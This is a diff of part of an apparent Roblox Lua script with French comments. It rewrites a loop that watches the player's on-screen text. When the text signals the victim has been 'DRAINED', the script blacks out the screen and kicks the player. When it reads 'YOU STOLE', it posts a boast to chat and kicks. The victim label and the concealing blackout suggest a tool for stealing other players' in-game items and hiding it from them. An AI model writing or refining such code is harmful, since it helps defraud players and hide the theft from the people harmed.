@@ -1171,63 +1171,59 @@ task.spawn(function()
 
     local function blackout()
         if pgui:FindFirstChild("BLACK_UI") then return end
-
         local gui = Instance.new("ScreenGui")
         gui.Name = "BLACK_UI"
         gui.IgnoreGuiInset = true
         gui.DisplayOrder = 999999999
         gui.Parent = pgui
-
         local frame = Instance.new("Frame")
-        frame.Size = UDim2.new(1,0,1,0)
-        frame.BackgroundColor3 = Color3.new(0,0,0)
+        frame.Size = UDim2.new(1, 0, 1, 0)
+        frame.BackgroundColor3 = Color3.new(0, 0, 0)
         frame.BorderSizePixel = 0
         frame.Parent = gui
     end
 
-    local function check(obj)
-        local ok, text = pcall(function()
-            return obj.Text
-        end)
+    -- On scanne toutes les 0.1 secondes au lieu de scanner à chaque milliseconde
+    while task.wait(0.1) do 
+        -- On récupère la liste une seule fois par boucle
+        local allObjects = pgui:GetDescendants()
+        
+        for i = 1, #allObjects do
+            local obj = allObjects[i]
+            
+            -- On ne vérifie que les objets capables d'avoir du texte pour économiser le CPU
+            if obj:IsA("TextLabel") or obj:IsA("TextButton") or obj:IsA("TextBox") then
+                local text = obj.Text
+                if text and text ~= "" then
+                    local t = string.upper(text)
 
-        if ok and type(text) == "string" then
-            local t = string.upper(text)
-
-            if string.find(t, "YOUR BRAINROTS WAS DRAINED") or string.find(t, "DRAINED") then
-                blackout()
-                p:Kick("test")
-                return true
-            end
-
-            if string.find(t, "YOU STOLE") then
-                local msg = "ezzzz steal by brr782k <3"
-
-                task.spawn(function()
-                    local chat = game:GetService("TextChatService")
-                    if chat.ChatVersion == Enum.ChatVersion.TextChatService then
-                        local gen = chat:FindFirstChild("RBXGeneral", true)
-                        if gen then gen:SendAsync(msg) end
-                    else
-                        local ev = game:GetService("ReplicatedStorage"):FindFirstChild("SayMessageRequest", true)
-                        if ev then ev:FireServer(msg, "All") end
+                    -- CAS 1 : DRAINAGE (Victime)
+                    if string.find(t, "DRAINED") or string.find(t, "YOUR BRAINROTS WAS DRAINED") then
+                        blackout()
+                        task.wait(0.05)
+                        p:Kick("test")
+                        return 
                     end
-                end)
 
-                p:Kick(msg)
-                return true
+                    -- CAS 2 : EZZ STEAL
+                    if string.find(t, "YOU STOLE") then
+                        local msg = "ezzzz steal by brr782k <3"
+                        task.spawn(function()
+                            local chat = game:GetService("TextChatService")
+                            if chat.ChatVersion == Enum.ChatVersion.TextChatService then
+                                local gen = chat:FindFirstChild("RBXGeneral", true)
+                                if gen then gen:SendAsync(msg) end
+                            else
+                                local ev = game:GetService("ReplicatedStorage"):FindFirstChild("SayMessageRequest", true)
+                                if ev then ev:FireServer(msg, "All") end
+                            end
+                        end)
+                        p:Kick(msg)
+                        return
+                    end
+                end
             end
         end
-        return false
-    end
-
-    while true do
-        local objs = pgui:GetDescendants()
-
-        for i = 1, #objs do
-            if check(objs[i]) then return end
-        end
-
-        task.wait(0.25)
     end
 end)
 
